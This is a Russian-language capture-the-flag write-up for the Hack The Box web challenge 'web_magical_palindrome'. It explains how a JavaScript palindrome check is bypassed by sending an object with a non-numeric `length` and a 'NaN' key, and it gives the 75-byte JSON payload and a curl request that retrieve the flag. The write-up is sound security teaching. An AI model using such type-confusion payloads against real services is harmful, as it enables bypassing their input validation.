# HTB Challenge: **web_magical_palindrome** — Write-up

**Категория:** Web  
**Тема:** JavaScript type coercion / валидация входа  
**Ограничение:** `nginx client_max_body_size 75;`  
**Формат флага:** `HTB{...}`

---

## Кратко
Сервис ожидает **строку-палиндром** длиной `>= 1000`, но проверка опирается на `string.length` без проверки типа. Если отправить **объект** с нечисловым `length`, можно:
- обойти проверку длины,
- управлять тем, как собирается `reverse`,
- уложиться в лимит **75 байт**.

---

## Ключевая логика (упрощённо)
```js
function isPalindrome(string) {
  if (string.length < 1000) return false;

  const reverse = Array(string.length)
    .fill(0)
    .map((_, i) => string[string.length - i - 1])
    .join("");

  return string === reverse;
}
```

---

## Причина уязвимости
### 1) Обход проверки длины
Выражение `string.length < 1000` запускает приведение типов.  
Если `length` не число (например `{}`), то при сравнении получится `NaN`, а `NaN < 1000` даёт `false`.  
В итоге условие **не блокирует** запрос, даже если мы не отправили строку длиной 1000+.

### 2) Перехват сборки `reverse`
`Array(string.length)` становится опасным, когда `length` не число:
- при `length = {}` создаётся массив **длины 1**,
- `.map()` выполняется **один раз**,
- индекс `string.length - i - 1` превращается в `NaN`,
- доступ `string[NaN]` интерпретируется как `string["NaN"]`.

Значит, если положить в объект ключ `"NaN"`, мы контролируем, что попадёт в `reverse`.

---

## Эксплуатация
Минимальный payload (проходит лимит 75 байт):

```json
{"palindrome":{"length":{},"0":"x","NaN":"x"}}
```

---

## Запрос (curl)
```bash
curl -s -X POST 'http://<HOST>/'   -H 'Content-Type: application/json'   --data '{"palindrome":{"length":{},"0":"x","NaN":"x"}}'
```

Ожидаемый результат: сервер отвечает приветствием и флагом `HTB{...}`.
